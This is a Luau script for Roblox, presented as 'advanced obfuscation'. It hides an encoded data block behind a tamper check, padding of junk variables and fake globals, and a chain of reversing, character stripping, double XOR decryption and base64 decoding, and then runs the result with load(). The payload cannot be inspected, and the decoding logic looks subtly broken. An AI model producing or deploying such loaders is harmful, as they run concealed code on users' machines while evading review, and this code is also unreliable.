
-- Advanced Luau Obfuscation (Roblox-Compatible)
local bit32 = bit32  -- Ensure bitwise operations work in Luau
local _dataBlock = "wp7DncOcwqjCmMKdwqDDhMKGwoLClcKwwofClcK8wrzCjsKLwpnCv8KWwo3CtMWnxbbFssSsxYDFtcWlxYzFjsW+xbvFqcWIxbvEtsWExZXFpsW9xYvFkMWkxZvFnMWZxa7ErMWDxZ/Ft8SmxZTFtsWWxJTFlcWgxZXFlcWsxJzFnsWYxa/FqMWfxJbFpMWSxYbEhMSExbDFmsW7xbzFi8WOxYrFr8W/xYjFncW0xJDEtsSwxJPEh8SrxLXEjMWnxL7EusSbxIjEqsS9xIDEgcSmxKDEvcSQxLLEpcScxanErsWvxbTEmMSxxL3ElMSUxJbEjcSRxKfElsSFxKzEusSexIXEo8SvxJzEncSkxJrEhsWGxJHEt8SfxLvEvMWIxI7FjsWUxLjEkcSzxLTHjMe2x7PHl8eAx6LGvseMx6PHvse6x5/Hice7x63HmMekx6nHi8eLx5HHpse1x4DHtcehx7jGtMeZx6zHrceIx7LHmce4xozHoceXxp7HsMeex5HHiMaYx6nHnceNx7zGiceJx77Hicexx4bHu8egx4HHgceYx43HuseXx7PHrMatxrnGmMalxoLGr8aLxpDGscaxxqvGh8aKxqrGg8aYxoDGqcaIx6DGkcahxpvGgMesxqHGu8axxpnGqMaTxozGjcaZxqjGr8ahxozGlcawx5/CkcKwwpnCqcKAw5bCuMKKwonCuMKnwrLCgMK7wqDCtMKBwrDCkcK5wpXCncKoxajFucWgxbXFgsWxxaXFkMWDxbHFk8WPxYrFvMW9xZjFusWpxbPFocWRxb7Fm8WAxY7FocWAxa3FmcWwxZPFjMWjxZnFu8WrxaLFjcWrxbDFjcWRxbDFu8WqxYLFjcW4xIPFicW7xIDFscWZxbvFpMW1xYHFtsWdxbnFi8SGxazEs8S5xI7FtMSBxLDEi8SUxKTEscSGxI/EisS8xK3EnMSyxKnEm8SfxJLEoMSbxITEt8ShxJHEl8SZxLbEvcSMxKbEmcSoxLPEosSKxZ7EtMSyxJHEi8S7xKrEm8SdxLzEtMSJxJPEp8SyxIDEu8SkxLPEgcSxxYzEusSNxJ3ErMeKx7nHiMeXx4HHrceLx5TGvsexx4DHqceJx6PHrcecx4LHqceex7HHkse+x6XHhMazx6HHkMeTx5rHsMeTx4zHiMeZx7jHkceix43Gnse0x5/Hkcejx7/HqseKx53HvMe/x4nHu8ejx7LHmceVx6THq8eBx7PHs8e6x5PGhsesx7XGucaOxrnGgsasxovGlMabxrHGg8e4xorGpcatxpzGosapxpnHoMaSxrnGm8aExrTGocaTxq3Gmsaxxq3GjMaoxpnHlMeQxqzGi8eexoLGqsKRw57CgcKkwoDCjcKKwr3CicOFw5zCs8KFwrvCksKLwoHDjMK3wrvCiMKdwprFtsW5xLTFj8WDxbfFi8WixYDFscS8xaHFi8WixLbFrsW4xanEp8WxxZPFo8WlxbLFvMWhxKzFvcWUxazFrcW+xZXFmcWTxZHFo8WWxYXFgsScxZHEncW/xavFn8WdxYrFqMWJxIbFncW8xZ3FhcWSxI7FgcSNxZXFu8WVxbPFmsSUxLnFtsSTxIPEosW+xKLEvsSxxb7EscSLxKfEg8SqxJ7EqcWkxJ/Ek8S5xa7EssWqxKHFrsSPxJTEqcStxLrElcSZxZTEs8SjxILFnsSCxIHEkcWfxL/Eq8SGxKPEisSXxInFhMS7xLzEgcWOxJLEmcSBxY/Es8S7xJbEncSex4/Huca3x4vHg8epxr7Hosesx7HGv8ebx4THu8a2x67HgMepx6LHoceQx6PGrsecx4s="
local _key1 = 195
local _key2 = 233
local _expectedHash = "68143"

-- Tamper Detection
local function verifyIntegrity()
    local function calculateHash(str)
        if not str then return "0" end
        local sum = 0
        for i = 1, #str do
            sum = sum + (string.byte(str, i) or 0)
        end
        return tostring(sum % 100000)
    end
    if calculateHash(_dataBlock) ~= _expectedHash then
        error("Integrity check failed. Terminating.")
    end
end
verifyIntegrity()

-- Junk Data Injection
local junkVariables = {}
for i = 1, 300 do
    junkVariables[i] = "DATA_" .. tostring(math.random(100000, 999999))
end

-- Scrambling Cleanup
local function clean(str)
    return str and str:gsub("[XYZ123!@#$%^&*()-_=+[{]}|;:,<.>/?]", "") or ""
end

-- Reverse Function
local function reverse(str)
    return str and str:reverse() or ""
end

-- Decryption Function (Using bit32.bxor for Luau)
local function decrypt(str, key)
    if not str then return "" end
    local decoded = ""
    for i = 1, #str do
        local charByte = string.byte(str, i)
        if charByte then
            decoded = decoded .. string.char(bit32.bxor(charByte, key + (i % 256)))
        end
    end
    return decoded
end

-- Base64 Decode Function
local function decodeBase64(str)
    if not str then return "" end
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Extra Fake Execution Paths
for i = 1, 150 do
    local name = "fakeData_" .. i
    _G[name] = tostring(math.random(1, 100000)) .. "_DUMMY"
end

-- Execute Decrypted Script (Compatible with Luau & Roblox)
local decrypted = decrypt(decrypt(reverse(clean(_dataBlock)), _key2), _key1)
if decrypted and #decrypted > 0 then
    local scriptFunc = load(decodeBase64(decrypted))
    if scriptFunc then scriptFunc() end
end
